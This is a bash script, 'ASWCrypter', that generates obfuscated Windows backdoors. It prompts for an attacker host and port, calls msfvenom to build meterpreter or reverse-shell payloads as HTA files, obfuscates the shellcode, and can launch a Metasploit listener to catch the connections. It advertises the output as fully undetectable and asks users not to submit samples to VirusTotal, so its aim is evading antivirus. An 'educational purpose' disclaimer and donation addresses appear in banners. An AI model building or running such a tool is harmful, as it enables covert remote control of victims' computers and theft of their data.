resize -s 40 95 > /dev/null
# inicio
RESTORE=$(printf '\033[0m')
RED=$(printf '\033[00;31m')
GREEN=$(printf '\033[00;32m')
YELLOW=$(printf  '\033[00;33m')
BLUE=$(  printf '\033[00;34m')
MAGENTA=$( printf  '\033[00;35m')
PURPLE=$(  printf '\033[00;35m')
CYAN=$(  printf '\033[00;36m')
LIGHTGRAY=$(   printf '\033[00;37m')
LRED=$( printf  '\033[01;31m')
LGREEN=$(  printf '\033[01;32m')
LYELLOW=$( printf  '\033[01;33m')
LBLUE=$(  printf '\033[01;34m')
LMAGENTA=$(  printf '\033[01;35m')
LPURPLE=$( printf  '\033[01;35m')
LCYAN=$(  printf '\033[01;36m')
WHITE=$(  printf '\033[01;37m')

OS=`uname` # grab OS
user=`who | awk {'print $1'}` 
distribution=`awk '{print $1}' /etc/issue` 
getPATH=`pwd` 

 
 
# check dependencies (msfconsole)
imp=`which msfconsole`
if [ "$?" -eq "0" ]; then
echo "[✔]msfconsole found" > /dev/null 2>&1
else
echo ""
echo "[X] msfconsole -> not found!"
echo "[!] This script requires msfconsole to work!"
sleep 2
exit
fi
  

 
# bash trap ctrl-c
 
trap ctrl_c INT
ctrl_c() {
echo "[+] CTRL+C PRESSED !"
sleep 1
echo "[+] Cleanning generated files..."

cd $getPATH && rm $getPATH/Base64 > /dev/null 2>&1 && rm $getPATH/shellWithNull > /dev/null 2>&1 && rm $getPATH/output/chars.raw > /dev/null 2>&1 && rm $getPATH/PayloadNametemp.hta > /dev/null 2>&1 && rm $getPATH/buildFrag > /dev/null 2>&1 && rm $getPATH/fragFile > /dev/null 2>&1 
cd $getPATH && rm $getPATH/fragFile > /dev/null 2>&1
cd $getPATH && rm $getPATH/buildFrag > /dev/null 2>&1

#buildFrag

# exit ASWCrypter.sh
echo "[+] Exit Shellcode Generator..."
sleep 1
if [ "$distribution" = "Kali" ]; then
echo "$CYAN[✔] Stop postgresql service..        [$GREEN OK $CYAN]$RESTORE"

service postgresql stop > /dev/null 2>&1
else
echo "$CYAN[✔] Stop metasploit service..        [$GREEN OK $CYAN]$RESTORE"
/etc/init.d/metasploit stop > /dev/null 2>&1
fi
cd $getPATH
cd ..
sudo chown -hR $user shell > /dev/null 2>&1

ASWexit
exit
}
ASWhelp () {

echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
$RED
Note:      The author does not hold any responsibility for the bad use of this tool,
           remember this is only for educational purpose.
                             $RESTORE
$CYAN
Donation : PayPal abedalqader9961@gmail.com

           bitcoincash:qp4lpvvmd8qsmvp8jx322rgdqksqmwnj75uc5yee5s

           Dogecoin DNv7wpra4V9hQpDLAE29NH6BC1mYjz3Ycs

           Eth 0x896ee0683ee300906b81286fca88a71768aac174

           Litecoin LPtqHJsLTDix7QXC45KaFe1dRLoVooeMWZ
$RESTORE
$YELLOW

Help :     If you need any help please let me know ;) :) 
           Facebook : https://www.facebook.com/crypter1996a
           Email :    abedalqadersweedan94@gmail.com
$RESTORE
"



}
generateShell () {
# get user input to build shellcode
printf "[+] $GREEN SET LHOST: $RESTORE"
read lhost
if [ "$?" -eq "0" ]; then
printf "[+] $GREEN SET LPORT:$RESTORE "

read lport

clear;
echo  "$RED

 .d8b.  .d8888. db   d8b   db  .o88b. d8888b. db    db d8888b. d888888b d88888b d8888b. 
d8'  8b 88'  YP 88   I8I   88 d8P  Y8 88   8D  8b  d8' 88   8D  ~~88~~' 88'     88   8D 
88ooo88  8bo.   88   I8I   88 8P      88oobY'   8bd8'  88oodD'    88    88ooooo 88oobY' 
88~~~88    Y8b. Y8   I8I   88 8b      88 8b      88    88~~~      88    88~~~~~ 88 8b   
88   88 db   8D  8b d8'8b d8' Y8b  d8 88  88.    88    88         88    88.     88  88. 
YP   YP  8888Y'   8b8'  8d8'    Y88P' 88   YD    YP    88         YP    Y88888P 88   YD 
                                                                                        
					
			 $BLUE Coded by $YELLOW AbedAlqader Swedan 
		         $BLUE Fb:$YELLOW https://www.fb.com/crypter1996a	
			 $BLUE Email:$YELLOW abedalqadersweedan94@gmail.com	
 $RESTORE
"
echo "$RED [+] Select an payload To start: "

# input payload choise
echo "$GREEN
			[1] windows/shell_bind_tcp  ` sleep 0.3`
			[2] windows/shell/reverse_tcp 
			[3] windows/meterpreter/reverse_tcp$YELLOW [Recommended]$GREEN
			[4] windows/meterpreter/reverse_tcp_dns 
			[5] windows/meterpreter/reverse_http   
			[6] windows/x64/meterpreter/reverse_tcp\n$RESTORE"
 

read -p "[!] Select an payload: " choice
case $choice in

1) paylo="windows/shell_bind_tcp" ;;
2) paylo="windows/shell/reverse_tcp";;
3) paylo="windows/meterpreter/reverse_tcp" ;;
4) paylo="windows/meterpreter/reverse_tcp_dns" ;;
5) paylo="windows/meterpreter/reverse_http" ;;
6) paylo="windows/x64/meterpreter/reverse_tcp";;
*) echo "\"$choice\": is not a valid Option"; sleep 2;;
esac
read -p "[!] Enter payload output name [example: HtaASCrypter]: " PayloadName

echo "[$GREEN+$RESTORE]$YELLOW Building shellcode ...$RESTORE"
sleep 2
xterm -T "SHELLCODE GENERATOR(ASWCrypter)" -geometry 100x50 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -i 43 -f hta-psh > $getPATH/output/chars.raw"
clear;
echo "

				     █ 🚬██ ▄▄▄▄▄▃        
				..▂▄▅█████▅▄▃▂
				[███████████████           
				 ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙⊙▲⊙
	01000001 01010011 01010111 			01000011 01110010 01111001
	01110000 01110100 01100101			01110010
				 
	                 $BLUE Coded by $YELLOW AbedAlqader Swedan 
		         $BLUE Fb:$YELLOW https://www.fb.com/crypter1996a	
			 $BLUE Email:$YELLOW abedalqadersweedan94@gmail.com
"

echo "[$GREEN+$RESTORE]$YELLOW Running a Python Script...$RESTORE "
sleep 2
store=`cat $getPATH/output/chars.raw | awk {'print $7'}`
getBase64=`echo $store | awk -F "," '{print $1}'| sed 's/.$//'`
echo $getBase64 > Base64
echo ""
sleep 2
#Run Python Script
python obfuscate.py

getShell=`cat buildFrag`
echo "[$GREEN✔$RESTORE]$YELLOW Injecting shellcode -> $PayloadName.hta! $RESTORE"
 
sleep 3



mv bk.hta $getPATH/output/$PayloadName.hta > /dev/null 2>&1
sleep 1
sed "s|Fa0CB0Ok|$getShell|g" $getPATH/output/$PayloadName.hta > PayloadNametemp.hta
mv PayloadNametemp.hta $getPATH/output/$PayloadName.hta > /dev/null 2>&1
chown $user $getPATH/output/$PayloadName.hta > /dev/null 2>&1


# CHOSE Run multi-handler or NOT 
read -p "Do you want run multi-handler? [Y/N]: " serv
 

   if [ "$serv" = "y" ] || [ "$serv" = "Y" ] ; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[+] Start a multi-handler..."
      echo "[+] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 100x50 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
             
      sleep 2
   else
      ASWexit
   fi
 
else

  echo "[x] Abort module execution .."
  sleep 2
   
  clear
fi
}

 
ASWexit () {

echo "$CYAN[✔] Stoping Services...        [$GREEN OK $CYAN]$RESTORE"
sleep 1
if [ "$distribution" = "Kali" ]; then
service postgresql stop > /dev/null 2>&1
service apache2 stop > /dev/null 2>&1
else
/etc/init.d/metasploit stop > /dev/null 2>&1
/etc/init.d/apache2 stop  > /dev/null 2>&1
fi
cd $getPATH && rm $getPATH/Base64 > /dev/null 2>&1 && rm $getPATH/shellWithNull > /dev/null 2>&1 && rm $getPATH/output/chars.raw > /dev/null 2>&1 && rm $getPATH/PayloadNametemp.hta > /dev/null 2>&1 && rm $getPATH/buildFrag > /dev/null 2>&1 && rm $getPATH/fragFile > /dev/null 2>&1 
cd $getPATH && rm $getPATH/fragFile > /dev/null 2>&1
cd $getPATH && rm $getPATH/buildFrag > /dev/null 2>&1
cd ..
ASWhelp
exit

}

 

if [ $(id -u) != "0" ]; then
  echo "[x] we need to be root to run this script..."
  echo "[x] execute [ sudo ./ASWCrypter.sh ] on terminal"
  exit
else
  :
fi

clear
#echo " $RED==================================================================$RESTORE"
echo "$CYAN   
		    _    ___  _        __ ___                  _            
		   / \  / ___\ \      / / ___|_ __ _   _ _ __ | |_ ___ _ __ 
		  / _ \ \___\'\'\ /\ / / |   |  __| | | |  _ \| __/ _ \  __|
		 / ___ \ ___) |\ V  V /| |___| |  | |_| | |_) | ||  __/ |   
		/_/   \_\____/  \_/\_/  \____|_|   \__  | .__/ \__\___|_|   
						   |___/|_|                 
$YELLOW   
                                +++++++++++++++++++++ 
				|A|S|W|C|r|y|p|t|e|r|
                                +++++++++++++++++++++
$RED     $OS|$user$YELLOW|2018|$distribution   	             

	         $BLUE Author:$YELLOW AbedAlqader Swedan
		 $BLUE Fb:$YELLOW https://www.fb.com/crypter1996a	
		 $BLUE Email:$YELLOW abedalqadersweedan94@gmail.com	
 		 $BLUE Version:$YELLOW 1.0              
";
echo "   $RED         
                     PLEASE DON'T UPLOAD BACKDOOT TO WWW.VIRUSTOTAL.COM"
echo "                       YOU CAN UPLOAD BACKDOOR TO WWW.NODISTRIBUTE.COM   "
echo "
                   ++++++++++++++++++++++++++++++++++++++++++++++++++++
                   +  Remember this tool only for educational purpose.+
                   +    The author does not hold any responsibility   +
                   +         for the bad use ofthis tool.             +
                   +                                                  +
                   ++++++++++++++++++++++++++++++++++++++++++++++++++++
              	 "
echo "[=============================================================================]"
sleep 2
	if [ "$distribution" = "Kali" ]; then
	echo "$CYAN[✔] Starting postgresql service.. [$GREEN OK $CYAN]$RESTORE"
        sleep 1
	service postgresql start    > /dev/null 2>&1
	else
        sleep 1
	echo "$CYAN[✔] Starting metasploit service.. [$GREEN OK $CYAN]$RESTORE"
	/etc/init.d/metasploit start      > /dev/null 2>&1
        sleep 1
	fi
        sleep 1				
	echo "$CYAN[✔] Shellcode Generator ..        [$GREEN OK $CYAN]$RESTORE"
	sleep 1
        echo "$CYAN[✔] Check User $user [$GREEN OK $CYAN]$RESTORE"
	echo "        $RED[+] Choose option To start:$RESTORE"
        echo "$YELLOW
                           [G]Generate Backdoor $GREEN[FUD]$YELLOW
                           [H]Help
                           [E]Exit$RESTORE
                          
"
     
	 
	read -p "       $YELLOW [+] Enter Your Choose:" choice
	clear;
        echo "

                                  $BLUE        ASWCrypter$YELLOW  
         		  _                _  _  _  _        _             _   
			_(_)_            _(_)(_)(_)(_)_     (_)           (_)  
		      _(_) (_)_         (_)          (_)    (_)           (_)  
		    _(_)     (_)_       (_)_  _  _  _       (_)     _     (_)  
		   (_) _  _  _ (_)        (_)(_)(_)(_)_     (_)   _(_)_   (_)  
		   (_)(_)(_)(_)(_)       _           (_)    (_)  (_) (_)  (_)  
		   (_)         (_)      (_)_  _  _  _(_)    (_)_(_)   (_)_(_)  
		   (_)         (_)        (_)(_)(_)(_)        (_)       (_)                               
			+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
			|C|o|d|e|d|B|y|A|b|e|d|A|l|q|a|d|e|r|S|w|e|d|a|n|
			+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                                 $RED      A                     S W $RESTORE                                         
                              
		        $BLUE Author:$YELLOW AbedAlqader Swedan
			$BLUE Fb:$YELLOW https://www.fb.com/crypter1996a	
			$BLUE Email:$YELLOW abedalqadersweedan94@gmail.com	
	 		$BLUE Version:$YELLOW 1.0	
" 
	case $choice in
	G) generateShell ;;
        g) generateShell ;;
	e) ASWexit ;;
	E) ASWexit ;;
        h) ASWhelp ;;
	H) ASWhelp ;;
	*) echo "\"$choice\": is not a valid Option"; sleep 2 ;;
	esac






